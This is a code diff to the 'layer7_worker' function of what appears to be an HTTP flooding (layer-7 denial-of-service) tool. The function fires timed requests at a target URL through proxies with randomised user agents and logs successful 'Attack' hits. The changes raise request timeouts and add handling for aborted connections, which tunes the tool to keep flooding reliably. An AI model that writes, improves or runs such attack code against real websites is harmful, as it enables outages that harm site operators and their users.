@@ -40,7 +40,7 @@ function layer7_worker(targetUrl, requestType, proxySelect, interval, time, thre
                             host: host,
                             port: parseInt(port)
                         },
-                        timeout: 2000
+                        timeout: 3000,
                     }).then((response) => {
                         if (response.status === 200) {
                             console.log(`${green}✓${white}${proxy.trim()} -> ${targetUrl}`);
@@ -50,7 +50,10 @@ function layer7_worker(targetUrl, requestType, proxySelect, interval, time, thre
                         }
                     });
                 }
-                catch (_) {
+                catch (error) {
+                    if (error.code === "ECONNABORTED") {
+                        console.error(`${yellow}Connection time out${white}`);
+                    }
                     console.log(`${yellow}△${white}${proxy.trim()} is timed out.`);
                 }
             }), interval);
@@ -71,6 +74,7 @@ function layer7_worker(targetUrl, requestType, proxySelect, interval, time, thre
                         headers: {
                             "User-Agent": (0, ua_gen_1.UAGen)(),
                         },
+                        timeout: 3000,
                     }).then((response) => {
                         if (response.status === 200) {
                             console.log(`${green}✓${white}Attack -> ${targetUrl}`);
@@ -80,8 +84,13 @@ function layer7_worker(targetUrl, requestType, proxySelect, interval, time, thre
                         }
                     });
                 }
-                catch (_) {
-                    console.log(`${yellow}△${white} Connection time out.`);
+                catch (error) {
+                    if (error.code === "ECONNABORTED") {
+                        console.error(`${yellow}Connection time out${white}`);
+                    }
+                    else {
+                        console.log(`${yellow}△${white} Connection time out.`);
+                    }
                 }
             }), interval);
             setTimeout(() => __awaiter(this, void 0, void 0, function* () {
